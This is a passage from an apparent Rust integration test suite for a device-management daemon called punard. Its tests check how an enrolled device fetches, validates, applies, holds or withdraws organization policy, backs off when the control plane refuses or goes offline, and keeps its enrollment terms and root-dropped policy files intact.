    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    assert!(!daemon.state_path(".policy.d.next").exists());
    assert!(!daemon.state_path(".policy.d.enroll-staging").exists());
    assert_eq!(
        read_json(&record_path)["policy_files"],
        json!(["eng-baseline-v12.json"]),
        "saved at startup"
    );
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["policy_ids"], json!(["eng-baseline-v12"]));
    daemon.result("enroll.stop", None);
    assert!(policy_d_files(&daemon).is_empty());
}

/// The revision of the files in policy.d that `names` lists, computed from
/// disk alone: what enroll.status must say the device enforces.
fn revision_on_disk(daemon: &TestDaemon, names: &[&str]) -> String {
    let mut framed = Vec::new();
    for name in names {
        let bytes = fs::read(daemon.state_path("policy.d").join(name)).unwrap();
        framed.extend_from_slice(name.as_bytes());
        framed.push(0);
        framed.extend_from_slice(&(bytes.len() as u64).to_be_bytes());
        framed.extend_from_slice(&bytes);
    }
    format!("sha256:{}", punard::util::sha256_hex(&framed))
}

/// enroll.status says which policy the device enforces, derived from the
/// files themselves, and since when; an enrollment recorded before any of it
/// existed reads as enforcing its policy since it enrolled.
#[test]
fn enroll_status_says_which_policy_is_enforced_and_since_when() {
    let dir = test_dir("policy-status");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let status = daemon.result("enroll.status", None);
    let policy = &status["policy"];
    assert_eq!(
        policy["revision"],
        revision_on_disk(&daemon, &["eng-baseline-v12.json"]),
        "{status}"
    );
    assert_eq!(policy["fetched_at"], status["enrolled_at"]);
    assert_eq!(policy["changed_at"], status["enrolled_at"]);
    assert_eq!(policy["last_refresh"], Value::Null);
    daemon.stop();

    // What a build before the refresh wrote.
    let record_path = dir.join("state/enrollment.json");
    let mut record = read_json(&record_path);
    for field in ["policy_hash", "policy_fetched_at", "policy_changed_at"] {
        record.as_object_mut().unwrap().remove(field);
    }
    fs::write(&record_path, record.to_string()).unwrap();
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["policy"]["revision"], Value::Null, "{status}");
    assert_eq!(status["policy"]["fetched_at"], status["enrolled_at"]);
    assert_eq!(status["policy"]["changed_at"], status["enrolled_at"]);

    // The first refresh derives it from the files, even one that refuses
    // what it was offered.
    control_plane
        .state
        .serve_bad_policy
        .store(true, Ordering::SeqCst);
    daemon.result("reconcile", None);
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["policy"]["last_refresh"]["result"], "rejected");
    assert_eq!(
        status["policy"]["revision"],
        revision_on_disk(&daemon, &["eng-baseline-v12.json"])
    );
}

// ---------------------------------------------------------------------------
// Live organization-policy refresh (docs/api/ipc.md sections 5.6, 5.10)
// ---------------------------------------------------------------------------

const LONG_AGO: &str = "2026-01-01T00:00:00Z";

/// The baseline envelope exactly as the in-test control plane serves it with
/// the firewall setting `enabled`.
fn served_baseline(enabled: bool) -> Value {
    let mut envelope: Value = serde_json::from_str(ACME_ENVELOPE).unwrap();
    let mut desired: Value = serde_json::from_str(ACME_DESIRED).unwrap();
    desired["spec"]["security"]["firewall"]["enabled"] = json!(enabled);
    envelope["policy"] = desired;
    envelope
}

/// Restart the daemon with the recorded fetch time set long ago, so a test
/// can tell a fetch time that moved from one that did not.
fn restarted_with_an_old_fetch(
    dir: &Path,
    daemon: TestDaemon,
    control_plane: &ControlPlane,
    firewall_state: &str,
) -> TestDaemon {
    daemon.stop();
    let record_path = dir.join("state/enrollment.json");
    let mut record = read_json(&record_path);
    record["policy_fetched_at"] = json!(LONG_AGO);
    fs::write(&record_path, record.to_string()).unwrap();
    TestDaemon::start(dir, Peer::root(), &control_plane.socket, firewall_state)
}

fn last_refresh(daemon: &TestDaemon) -> Value {
    daemon.result("enroll.status", None)["policy"]["last_refresh"].clone()
}

/// The organization turns its firewall rule off, and the next reconcile pass
/// fetches, checks and applies the new set, then enforces it in the same pass:
/// the device is remediated to the new value before the pass ends.
#[test]
fn a_changed_policy_reaches_an_enrolled_device_on_the_next_pass() {
    let dir = test_dir("refresh-changed");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let before = daemon.result("enroll.status", None)["policy"]["revision"].clone();

    *control_plane.state.firewall_enabled.lock().unwrap() = Some(false);
    let report = daemon.result("reconcile", None);
    let firewall = report["capabilities"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["capability"] == "security.firewall")
        .unwrap()
        .clone();
    assert_eq!(firewall["desired_state"], "disabled", "{report}");
    assert_eq!(firewall["remediation"], "applied", "{report}");
    assert_eq!(daemon.mock.state(), json!("disabled"));

    let explain = daemon.result("policy.explain", Some(json!({"path": "security.firewall"})));
    assert_eq!(explain["effective_value"], "disabled");
    assert_eq!(explain["source"]["policy_id"], "eng-baseline-v12");
    assert_eq!(
        policy_d_bytes(&daemon)["eng-baseline-v12.json"],
        serde_json::to_string_pretty(&served_baseline(false)).unwrap(),
        "canonical bytes"
    );
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["policy"]["last_refresh"]["result"], "applied");
    assert_eq!(
        status["policy"]["revision"],
        revision_on_disk(&daemon, &["eng-baseline-v12.json"])
    );
    assert_ne!(status["policy"]["revision"], before);
    let events = policy_events(&daemon);
    assert_eq!(events.len(), 1, "{events:?}");
    assert_eq!(events[0]["result"], "applied");
    assert_eq!(events[0]["resource"], "control_plane");
    assert_eq!(events[0]["policy_ids"], json!(["eng-baseline-v12"]));
    // The same pass reported the device as it now is.
    let compliance = control_plane.state.compliance.lock().unwrap();
    assert_eq!(compliance.last().unwrap()["report"]["overall"], "compliant");
}

/// A policy the organization adds is written, owned and enforced; one it
/// takes away is deleted; unenrolling removes exactly what is owned then.
#[test]
fn a_policy_added_or_removed_by_the_organization_is_written_or_deleted() {
    let dir = test_dir("refresh-add-remove");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");

    *control_plane.state.extra_envelopes.lock().unwrap() = vec![role_envelope("eng-role-sre")];
    daemon.result("reconcile", None);
    let mut files = policy_d_files(&daemon);
    files.sort();
    assert_eq!(files, ["eng-baseline-v12.json", "eng-role-sre.json"]);
    assert_eq!(
        read_json(&daemon.state_path("enrollment.json"))["policy_files"],
        json!(["eng-baseline-v12.json", "eng-role-sre.json"])
    );
    assert_eq!(
        daemon.result("enroll.status", None)["policy_ids"],
        json!(["eng-baseline-v12", "eng-role-sre"])
    );
    let events = policy_events(&daemon);
    assert_eq!(
        events.last().unwrap()["policy_ids"],
        json!(["eng-baseline-v12", "eng-role-sre"])
    );

    control_plane.state.extra_envelopes.lock().unwrap().clear();
    daemon.result("reconcile", None);
    assert_eq!(policy_d_files(&daemon), ["eng-baseline-v12.json"]);
    assert_eq!(
        daemon.result("enroll.status", None)["policy_ids"],
        json!(["eng-baseline-v12"])
    );
    let events = policy_events(&daemon);
    assert_eq!(events.len(), 2);
    assert_eq!(events[1]["result"], "applied");
    assert_eq!(events[1]["policy_ids"], json!(["eng-baseline-v12"]));

    *control_plane.state.extra_envelopes.lock().unwrap() = vec![role_envelope("eng-role-sre")];
    daemon.result("reconcile", None);
    daemon.result("enroll.stop", None);
    assert!(policy_d_files(&daemon).is_empty(), "no orphan left");
}

/// Only an explicit "nothing is assigned" withdraws the organization's
/// policy. The device stays enrolled; the layers it installed, the local
/// administration veto among them, and the browser document go.
#[test]
fn assigning_nothing_withdraws_policy_but_the_device_stays_enrolled() {
    let dir = test_dir("refresh-withdraw");
    let control_plane = ControlPlane::start(&dir);
    control_plane
        .state
        .deny_local_admin
        .store(true, Ordering::SeqCst);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let rendered = daemon.state_path("browser-policy/rendered.json");
    assert!(rendered.exists());
    assert_eq!(
        daemon.result("policy.effective", None)["local_admin"]["allowed"],
        false
    );

    control_plane
        .state
        .serve_no_policy
        .store(true, Ordering::SeqCst);
    daemon.result("reconcile", None);
    assert!(policy_d_files(&daemon).is_empty());
    assert!(!rendered.exists(), "the managed browser document goes");
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["enrolled"], true);
    assert_eq!(status["policy_ids"], json!([]));
    assert_eq!(status["policy"]["last_refresh"]["result"], "withdrawn");
    assert_eq!(daemon.result("status", None)["mode"], "managed");
    assert_eq!(
        daemon.result("policy.effective", None)["local_admin"]["allowed"],
        true
    );
    let explain = daemon.result("policy.explain", Some(json!({"path": "security.firewall"})));
    assert_ne!(explain["source"]["policy_id"], "eng-baseline-v12");
    let events = policy_events(&daemon);
    assert_eq!(events.len(), 1);
    assert_eq!(events[0]["result"], "withdrawn");
    assert_eq!(events[0]["policy_ids"], json!(["eng-baseline-v12"]));

    // Nothing assigned, nothing held: the next pass is unchanged and quiet.
    daemon.result("reconcile", None);
    assert_eq!(last_refresh(&daemon)["result"], "unchanged");
    assert_eq!(policy_events(&daemon).len(), 1);
}

/// "Unchanged" means the files, the record that owns them and what the
/// daemon enforces all agree with what the organization serves. A policy
/// file the record owns can be gone from policy.d (root removed it) while
/// its layers stay enforced; when the organization then assigns nothing,
/// the empty set equals what is left on disk, and it is still a withdrawal:
/// the record is rewritten, the veto it carried is lifted, and it is
/// audited.
#[test]
fn a_withdrawal_is_not_unchanged_while_the_record_or_memory_disagree() {
    let dir = test_dir("refresh-record-disagrees");
    let control_plane = ControlPlane::start(&dir);
    let state = &control_plane.state;
    state.deny_local_admin.store(true, Ordering::SeqCst);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    assert_eq!(
        daemon.result("policy.effective", None)["local_admin"]["allowed"],
        false
    );

    fs::remove_file(daemon.state_path("policy.d/eng-baseline-v12.json")).unwrap();
    state.serve_no_policy.store(true, Ordering::SeqCst);
    daemon.result("reconcile", None);
    let status = daemon.result("enroll.status", None);
    assert_eq!(
        status["policy"]["last_refresh"]["result"], "withdrawn",
        "{status}"
    );
    assert_eq!(status["policy_ids"], json!([]));
    assert_eq!(
        daemon.result("policy.effective", None)["local_admin"]["allowed"],
        true,
        "the withdrawn policy's veto is lifted"
    );
    assert_eq!(
        read_json(&daemon.state_path("enrollment.json"))["policy_files"],
        json!([])
    );
    let events = policy_events(&daemon);
    assert_eq!(events.len(), 1, "{events:?}");
    assert_eq!(events[0]["result"], "withdrawn");
    assert_eq!(events[0]["policy_ids"], json!(["eng-baseline-v12"]));

    daemon.result("reconcile", None);
    assert_eq!(last_refresh(&daemon)["result"], "unchanged");
    assert_eq!(policy_events(&daemon).len(), 1);
}

/// An empty list the control plane does not vouch for — no marker, or a
/// bundle it could not use — takes nothing away, and is recorded once.
#[test]
fn an_empty_answer_without_an_explicit_none_keeps_the_last_good_policy() {
    let dir = test_dir("refresh-held");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let bytes = policy_d_bytes(&daemon);

    let state = &control_plane.state;
    state.serve_no_policy.store(true, Ordering::SeqCst);
    state.omit_assignment.store(true, Ordering::SeqCst);
    daemon.result("reconcile", None);
    daemon.result("reconcile", None);
    assert_eq!(policy_d_bytes(&daemon), bytes);
    assert_eq!(
        last_refresh(&daemon),
        json!({"at": last_refresh(&daemon)["at"], "result": "held", "reason": "unstated_empty"})
    );
    let events = policy_events(&daemon);
    assert_eq!(events.len(), 1, "once, not every pass: {events:?}");
    assert_eq!(events[0]["result"], "held");
    assert_eq!(events[0]["policy_ids"], json!(["eng-baseline-v12"]));

    state.omit_assignment.store(false, Ordering::SeqCst);
    *state.assignment.lock().unwrap() = Some("unusable");
    daemon.result("reconcile", None);
    assert_eq!(policy_d_bytes(&daemon), bytes);
    assert_eq!(last_refresh(&daemon)["reason"], "unusable_assignment");
    assert_eq!(policy_events(&daemon).len(), 2, "a new reason is news");
    // Nor does an empty list labelled as the policy: only "none" withdraws.
    *state.assignment.lock().unwrap() = Some("policies");
    daemon.result("reconcile", None);
    assert_eq!(policy_d_bytes(&daemon), bytes);
    assert_eq!(last_refresh(&daemon)["reason"], "empty_policies");
    assert_eq!(policy_events(&daemon).len(), 3);
    let explain = daemon.result("policy.explain", Some(json!({"path": "security.firewall"})));
    assert_eq!(explain["source"]["policy_id"], "eng-baseline-v12");

    *state.assignment.lock().unwrap() = None;
    state.serve_no_policy.store(false, Ordering::SeqCst);
    daemon.result("reconcile", None);
    let events = policy_events(&daemon);
    assert_eq!(events.len(), 4);
    assert_eq!(events[3]["result"], "unchanged", "the recovery");
}

/// A set that fails a check changes nothing: policy.d byte for byte, what
/// is enforced, and the time the enforced policy was fetched. Each distinct
/// set is recorded once, a restart still starts, and when the organization
/// serves a good set again one recovery is recorded.
#[test]
fn an_invalid_refresh_keeps_the_last_good_policy_and_is_recorded_once() {
    let dir = test_dir("refresh-invalid");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let daemon = restarted_with_an_old_fetch(&dir, daemon, &control_plane, "enabled");
    let bytes = policy_d_bytes(&daemon);
    let explain = daemon.result("policy.explain", Some(json!({"path": "security.firewall"})));
    let state = &control_plane.state;

    state.serve_bad_policy.store(true, Ordering::SeqCst);
    daemon.result("reconcile", None);
    daemon.result("reconcile", None);
    assert_eq!(policy_d_bytes(&daemon), bytes);
    assert!(!daemon.state_path(".policy.d.next").exists());
    assert_eq!(
        daemon.result("policy.explain", Some(json!({"path": "security.firewall"}))),
        explain
    );
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["policy"]["fetched_at"], LONG_AGO);
    assert_eq!(status["policy"]["last_refresh"]["result"], "rejected");
    assert_eq!(
        status["policy"]["last_refresh"]["reason"],
        "invalid_envelope"
    );
    let rejected = |daemon: &TestDaemon| {
        policy_events(daemon)
            .into_iter()
            .filter(|e| e["result"] == "rejected")
            .collect::<Vec<_>>()
    };
    assert_eq!(rejected(&daemon).len(), 1);
    assert_eq!(
        rejected(&daemon)[0]["policy_ids"],
        json!(["eng-baseline-v12"]),
        "the ids still enforced, never the ones offered"
    );

    state.serve_duplicate_ids.store(true, Ordering::SeqCst);
    daemon.result("reconcile", None);
    assert_eq!(last_refresh(&daemon)["reason"], "duplicate_policy_id");
    assert_eq!(rejected(&daemon).len(), 2, "another set");
    assert_eq!(policy_d_bytes(&daemon), bytes);

    // policy.d never held the refused set, so the daemon starts; and the
    // set it refused before is not recorded again.
    daemon.stop();
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    daemon.result("reconcile", None);
    assert_eq!(rejected(&daemon).len(), 2);

    state.serve_duplicate_ids.store(false, Ordering::SeqCst);
    state.serve_bad_policy.store(false, Ordering::SeqCst);
    daemon.result("reconcile", None);
    let events = policy_events(&daemon);
    assert_eq!(events.last().unwrap()["result"], "unchanged", "{events:?}");
    assert_eq!(events.len(), 3);
    assert_ne!(
        daemon.result("enroll.status", None)["policy"]["fetched_at"],
        LONG_AGO
    );
}

/// A control plane that refuses is asked again less and less often — one,
/// three, seven passes skipped — while the last good policy stays enforced;
/// the refusal is recorded once, and so is the recovery.
#[test]
fn a_refused_fetch_backs_off_and_keeps_policy() {
    let dir = test_dir("refresh-refused");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let bytes = policy_d_bytes(&daemon);
    let state = &control_plane.state;
    let fetched_before = fetch_count(state);

    *state.refuse_policy_fetch.lock().unwrap() = Some("internal");
    for _ in 0..8 {
        daemon.result("reconcile", None);
    }
    assert_eq!(
        fetch_count(state) - fetched_before,
        4,
        "passes 1, 2, 4 and 8 asked"
    );
    assert_eq!(policy_d_bytes(&daemon), bytes);
    assert_eq!(
        last_refresh(&daemon),
        json!({"at": last_refresh(&daemon)["at"], "result": "refused", "reason": "internal"})
    );
    let events = policy_events(&daemon);
    assert_eq!(events.len(), 1, "{events:?}");
    assert_eq!(events[0]["result"], "refused");

    *state.refuse_policy_fetch.lock().unwrap() = None;
    let asked = fetch_count(state);
    for _ in 0..7 {
        daemon.result("reconcile", None);
    }
    assert_eq!(fetch_count(state), asked, "seven passes skipped");
    daemon.result("reconcile", None);
    assert_eq!(fetch_count(state), asked + 1);
    let events = policy_events(&daemon);
    assert_eq!(events.len(), 2);
    assert_eq!(events[1]["result"], "unchanged");
}

/// A refusal that depends on this device's own files is remembered with
/// them and not staged again, so asking again costs one fetch and nothing
/// else: the fetch is not backed off, and the organization's correction is
/// enforced on the very next pass rather than up to half an hour later.
#[test]
fn a_remembered_local_refusal_is_asked_about_again_on_every_pass() {
    let dir = test_dir("refresh-remembered");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let state = &control_plane.state;
    // Root's drop, and a changed set from the organization that cannot be
    // loaded beside it.
    write_file(
        &daemon.state_path("policy.d/clash.json"),
        json!({"policy_id": "eng-baseline-v12", "source_kind": "organization_role_policy",
               "precedence_rank": 3, "source_name": "root's"})
        .to_string(),
    );
    *state.firewall_enabled.lock().unwrap() = Some(false);
    let fetched_before = fetch_count(state);
    for _ in 0..6 {
        daemon.result("reconcile", None);
    }
    assert_eq!(fetch_count(state) - fetched_before, 6, "every pass asked");
    let refresh = last_refresh(&daemon);
    assert_eq!(refresh["result"], "failed", "{refresh}");
    assert_eq!(
        refresh["reason"], "conflicts_with_local_policy",
        "{refresh}"
    );
    let failed = policy_events(&daemon)
        .iter()
        .filter(|e| e["result"] == "failed")
        .count();
    assert_eq!(failed, 1, "recorded once");

    // The organization takes its change back: enforced on the next pass.
    *state.firewall_enabled.lock().unwrap() = None;
    daemon.result("reconcile", None);
    assert_eq!(last_refresh(&daemon)["result"], "unchanged");
}

/// While the device is offline every fetch fails, and the refresh backs off
/// as it would from a refusing server. Once a report gets through the link is
/// back, and what the outage built up says nothing about the organization's
/// server: a policy it changed meanwhile is fetched on the next pass, not up
/// to half an hour later.
#[test]
fn a_policy_changed_during_an_outage_is_fetched_once_the_link_is_back() {
    let dir = test_dir("refresh-after-outage");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let state = &control_plane.state;
    state.offline.store(true, Ordering::SeqCst);
    for _ in 0..8 {
        daemon.result("reconcile", None);
    }
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["last_sync"]["result"], "unreachable", "{status}");

    *state.firewall_enabled.lock().unwrap() = Some(false);
    state.offline.store(false, Ordering::SeqCst);
    // The reports get through; the fetch was still backed off.
    daemon.result("reconcile", None);
    assert_eq!(
        daemon.result("enroll.status", None)["last_sync"]["result"],
        "success"
    );
    daemon.result("reconcile", None);
    assert_eq!(last_refresh(&daemon)["result"], "applied");
    assert_eq!(daemon.mock.state(), json!("disabled"));
}

/// An answer longer than punard reads is the organization's to fix, not a
/// link to wait out: a refresh records it as refused by that rule, once,
/// keeps the last good policy and asks again on the very next pass, and
/// enroll.start refuses it by the same name rather than as an unreachable
/// control plane.
#[test]
fn an_answer_too_large_to_read_is_refused_by_name_and_not_backed_off() {
    let dir = test_dir("refresh-too-large");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let bytes = policy_d_bytes(&daemon);
    let state = &control_plane.state;
    let fetched_before = fetch_count(state);

    state
        .pad_policy_answer
        .store(punard::enroll::MAX_ANSWER_BYTES as usize, Ordering::SeqCst);
    for _ in 0..3 {
        daemon.result("reconcile", None);
    }
    assert_eq!(fetch_count(state) - fetched_before, 3, "never backed off");
    assert_eq!(policy_d_bytes(&daemon), bytes);
    let refresh = last_refresh(&daemon);
    assert_eq!(refresh["result"], "rejected", "{refresh}");
    assert_eq!(refresh["reason"], "answer_too_large", "{refresh}");
    let events = policy_events(&daemon);
    assert_eq!(events.len(), 1, "{events:?}");
    assert_eq!(events[0]["result"], "rejected");

    daemon.result("enroll.stop", None);
    let error = daemon.error("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(error["code"], "invalid_params", "{error}");
    assert_eq!(error["details"]["reason"], "answer_too_large", "{error}");
    assert!(!daemon.state_path("enrollment.json").exists());
}

/// A set this device cannot install backs off like a fetch that failed:
/// retrying at once would only repeat the same local failure, staging and
/// syncing the whole set each time on a device that may be short of space.
#[test]
fn a_set_the_device_cannot_install_backs_off_like_a_failed_fetch() {
    let dir = test_dir("refresh-local-backoff");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let state = &control_plane.state;
    // Nothing can be staged: the staging path is a file.
    write_file(&daemon.state_path(".policy.d.next"), "not a directory");
    *state.firewall_enabled.lock().unwrap() = Some(false);
    let fetched_before = fetch_count(state);
    for _ in 0..8 {
        daemon.result("reconcile", None);
    }
    assert_eq!(
        fetch_count(state) - fetched_before,
        4,
        "passes 1, 2, 4 and 8 asked"
    );
    let refresh = last_refresh(&daemon);
    assert_eq!(refresh["result"], "failed", "{refresh}");
    assert_eq!(refresh["reason"], "io", "{refresh}");
}

/// A reconcile pass spends at most its budget on the control plane,
/// however the link fails, so punarctl's wait for it (and the timer's unit)
/// never runs out: on a link that takes every request and answers none, the
/// policy fetch is waited out, and the reports that no longer fit in what is
/// left are not sent at all, staying pending for the next pass. A frozen
/// agent, which does not answer even the liveness call it answers from the
/// device alone, is waited out once and asked nothing more: management
/// interrupted, not the network.
#[test]
fn a_pass_on_a_black_holed_link_ends_inside_its_budget() {
    // Room for the fetch and a compliance report on a link that answers
    // (5 + 9 s waited out would not fit, 0 + 9 does); on one that does not,
    // the fetch alone is waited out. The liveness call's whole wait fits.
    const BUDGET: Duration = Duration::from_secs(10);
    let dir = test_dir("black-hole");
    let control_plane = ControlPlane::start(&dir);
    let state = &control_plane.state;
    let daemon = TestDaemon::start_with(
        &dir,
        Peer::root(),
        &control_plane.socket,
        "enabled",
        Vec::new(),
        |cfg| cfg.reconcile_control_plane_budget = BUDGET,
    );
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    state.methods.lock().unwrap().clear();

    state.black_hole.store(true, Ordering::SeqCst);
    let started = std::time::Instant::now();
    daemon.result("reconcile", None);
    let took = started.elapsed();
    assert!(took < BUDGET + Duration::from_secs(1), "{took:?}");
    // The agent answers the liveness call; the fetch is waited out (it may
    // wait on the organization's server), and the reports no longer fit.
    assert_eq!(
        *state.methods.lock().unwrap(),
        ["identity.status", "policy.fetch"],
        "the reports were not sent"
    );
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["last_sync"]["pending"], true, "{status}");
    assert_eq!(status["last_sync"]["result"], "unreachable", "{status}");
    assert_eq!(status["management"]["state"], "active", "{status}");

    // A frozen agent: the liveness call is waited out, and nothing more is
    // asked of it.
    state.frozen.store(true, Ordering::SeqCst);
    state.methods.lock().unwrap().clear();
    let started = std::time::Instant::now();
    daemon.result("reconcile", None);
    let took = started.elapsed();
    assert!(took < BUDGET + Duration::from_secs(1), "{took:?}");
    assert_eq!(*state.methods.lock().unwrap(), ["identity.status"]);
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["management"]["reason"], "not_answering", "{status}");
    state.frozen.store(false, Ordering::SeqCst);

    // The link back: the next pass sends what was pending.
    state.black_hole.store(false, Ordering::SeqCst);
    let reports = state.compliance.lock().unwrap().len();
    daemon.result("reconcile", None);
    assert_eq!(state.compliance.lock().unwrap().len(), reports + 1);
    assert_eq!(
        daemon.result("enroll.status", None)["management"]["state"],
        "active"
    );
}

/// The common case costs one request and nothing else: no file in policy.d
/// is rewritten or replaced, the browser document is untouched, nothing is
/// audited, and the time the enforced policy was fetched moves.
#[test]
fn an_unchanged_policy_costs_one_fetch_and_writes_nothing() {
    use std::os::unix::fs::MetadataExt;
    let dir = test_dir("refresh-unchanged");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let daemon = restarted_with_an_old_fetch(&dir, daemon, &control_plane, "enabled");
    let stamp = |path: PathBuf| {
        let meta = fs::metadata(path).unwrap();
        (meta.ino(), meta.modified().unwrap())
    };
    let before = (
        stamp(daemon.state_path("policy.d")),
        stamp(daemon.state_path("policy.d/eng-baseline-v12.json")),
        stamp(daemon.state_path("browser-policy/rendered.json")),
    );
    let asked = fetch_count(&control_plane.state);

    daemon.result("reconcile", None);
    daemon.result("reconcile", None);
    assert_eq!(fetch_count(&control_plane.state), asked + 2);
    assert_eq!(
        (
            stamp(daemon.state_path("policy.d")),
            stamp(daemon.state_path("policy.d/eng-baseline-v12.json")),
            stamp(daemon.state_path("browser-policy/rendered.json")),
        ),
        before
    );
    assert!(policy_events(&daemon).is_empty());
    let status = daemon.result("enroll.status", None);
    assert_eq!(status["policy"]["last_refresh"]["result"], "unchanged");
    assert_ne!(status["policy"]["fetched_at"], LONG_AGO);
}

/// A refresh changes the policy and nothing the person agreed to: the
/// organization's document is not read again, so neither removability nor
/// ownership nor the remote-query grant moves, however the organization's
/// terms change after enrollment.
#[test]
fn a_refresh_never_changes_the_enrollment_terms() {
    let dir = test_dir("refresh-terms");
    let control_plane = ControlPlane::start(&dir);
    let state = &control_plane.state;
    *state.org_removable.lock().unwrap() = Some(json!(false));
    *state.org_ownership.lock().unwrap() = Some(json!("organization"));
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    daemon.result(
        "enroll.start",
        Some(json!({
            "org_domain": "acme.com",
            "accept_non_removable": true,
            "accept_organization_owned": true
        })),
    );
    let terms = |status: &Value| {
        (
            status["removable"].clone(),
            status["organization_owned"].clone(),
            status["remote_query_scopes"].clone(),
            status["org"].clone(),
            status["enrolled_at"].clone(),
        )
    };
    let before = terms(&daemon.result("enroll.status", None));
    let terms_file = fs::read(daemon.state_path("enrollment-terms.json")).unwrap();
    let discovered = state
        .methods
        .lock()
        .unwrap()
        .iter()
        .filter(|m| *m == "org.discover")
        .count();

    *state.org_removable.lock().unwrap() = Some(json!(true));
    *state.org_ownership.lock().unwrap() = Some(json!("personal"));
    *state.firewall_enabled.lock().unwrap() = Some(false);
    daemon.result("reconcile", None);
    assert_eq!(last_refresh(&daemon)["result"], "applied");
    assert_eq!(terms(&daemon.result("enroll.status", None)), before);
    assert_eq!(
        fs::read(daemon.state_path("enrollment-terms.json")).unwrap(),
        terms_file
    );
    let discovered_after = state
        .methods
        .lock()
        .unwrap()
        .iter()
        .filter(|m| *m == "org.discover")
        .count();
    assert_eq!(
        discovered_after, discovered,
        "the document is not read again"
    );
    let error = daemon.error("enroll.stop", None);
    assert_eq!(error["details"]["reason"], "enrollment_not_removable");
}

/// A file a root administrator drops into policy.d after enrollment survives
/// every refresh as the same file, is loaded with the new set as a restart
/// would load it, and a set that names it is refused, once.
#[test]
fn a_foreign_policy_d_file_survives_and_blocks_a_colliding_id() {
    use std::os::unix::fs::MetadataExt;
    let dir = test_dir("refresh-foreign");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    let policy_d = daemon.state_path("policy.d");
    write_file(
        &policy_d.join("local-lab.json"),
        json!({
            "policy_id": "local-lab",
            "source_kind": "organization_role_policy",
            "precedence_rank": 3,
            "policy": {"spec": {"security": {"localAdmin": {"policyEditing": "denied"}}}}
        })
        .to_string(),
    );
    let inode = fs::metadata(policy_d.join("local-lab.json")).unwrap().ino();
    let local = fs::read(policy_d.join("local-lab.json")).unwrap();

    *control_plane.state.firewall_enabled.lock().unwrap() = Some(false);
    daemon.result("reconcile", None);
    assert_eq!(last_refresh(&daemon)["result"], "applied");
    assert_eq!(
        fs::metadata(policy_d.join("local-lab.json")).unwrap().ino(),
        inode
    );
    assert_eq!(
        daemon.result("enroll.status", None)["policy_ids"],
        json!(["eng-baseline-v12"])
    );
    let effective = daemon.result("policy.effective", None);
    assert_eq!(effective["local_admin"]["source"]["policy_id"], "local-lab");

    *control_plane.state.extra_envelopes.lock().unwrap() = vec![role_envelope("local-lab")];
    daemon.result("reconcile", None);
    daemon.result("reconcile", None);
    assert_eq!(fs::read(policy_d.join("local-lab.json")).unwrap(), local);
    assert_eq!(
        last_refresh(&daemon),
        json!({"at": last_refresh(&daemon)["at"], "result": "rejected",
               "reason": "foreign_file_collision"})
    );
    let rejected = policy_events(&daemon)
        .into_iter()
        .filter(|e| e["result"] == "rejected")
        .count();
    assert_eq!(rejected, 1);
    daemon.result("enroll.stop", None);
    assert_eq!(policy_d_files(&daemon), ["local-lab.json"]);
}

/// A capability suppressed after three failed repairs is tried again as soon
/// as the organization changes the value it must reach: the promise is
/// "until the effective value changes", and a refresh changes it.
#[test]
fn a_policy_change_lifts_remediation_suppression() {
    let dir = test_dir("refresh-suppression");
    let control_plane = ControlPlane::start(&dir);
    let daemon = enrolled(&dir, &control_plane, "enabled");
    daemon.mock.set_state(json!("disabled"));
    daemon.mock.fail_next_applies(true);
    let remediation = |report: &Value| {
        report["capabilities"]
            .as_array()
            .unwrap()
            .iter()
            .find(|c| c["capability"] == "security.firewall")
            .unwrap()["remediation"]
            .clone()
    };
    for _ in 0..3 {
        daemon.result("reconcile", None);
    }
    let applies = daemon.mock.apply_calls();
    assert_eq!(remediation(&daemon.result("reconcile", None)), "suppressed");
    assert_eq!(daemon.mock.apply_calls(), applies, "suppressed: not tried");

    *control_plane.state.firewall_enabled.lock().unwrap() = Some(false);
    daemon.mock.set_state(json!("enabled"));
    let report = daemon.result("reconcile", None);
    assert_eq!(
        daemon.mock.apply_calls(),
        applies + 1,
        "tried in the same pass"
    );
    assert_eq!(remediation(&report), "apply_failed");
}

/// Something is assigned that the control plane cannot turn into Punar
/// policy: the device enrolls with none, says why, and applies the policy
/// on the first pass that can use it.
#[test]
fn an_unusable_assignment_enrolls_with_no_policy_and_says_so() {
    let dir = test_dir("unusable-enroll");
    let control_plane = ControlPlane::start(&dir);
    let state = &control_plane.state;
    state.serve_no_policy.store(true, Ordering::SeqCst);
